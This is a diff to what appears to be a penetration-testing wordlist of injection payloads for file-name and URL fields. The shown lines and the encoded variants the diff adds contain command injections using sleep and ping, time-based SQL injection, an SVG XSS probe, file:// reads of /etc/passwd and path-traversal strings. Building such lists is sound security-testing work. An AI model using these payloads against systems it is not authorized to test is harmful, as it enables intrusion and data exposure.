@@ -26,10 +26,14 @@ https://{domain}/{fileName}.phpJunk123png
 file://home/secret/carlos
 file://etc/passwd
 sleep(10)-- -.jpg
+sleep(10)--%20-.jpg
 <svg onload=alert(document.domain)>
 ; sleep 10;
 https://{domain}/{fileName}.jpg; sleep 10;
 https://{domain}/{fileName}.png; sleep 10;
+https://{domain}/{fileName}.jpg;%20sleep%2010;
+https://{domain}/{fileName}.png;%20sleep%2010;
+
 https://…:.jpg
 https://…:.png
 https://{domain}/|{fileName}.jpg
@@ -40,7 +44,9 @@ https://{domain}/?{fileName}.jpg
 https://{domain}/"{fileName}.jpg
 https://{domain}/{fileName}?a=bbb||ping+-c+10+127.0.0.1||
 https://{domain}/{fileName}?a=bbb; sleep 10;
+https://{domain}/{fileName}?a=bbb;%20sleep%2010;
 https://{domain}/{fileName}; sleep 10;
+https://{domain}/{fileName};%20sleep%2010;
 https://{domain}/{fileName}<svg onload=alert(document.domain)>
 https://{domain}/{fileName}../../../tmp/lol.png
 https://{domain}/{fileName}/../../../tmp/lol.png
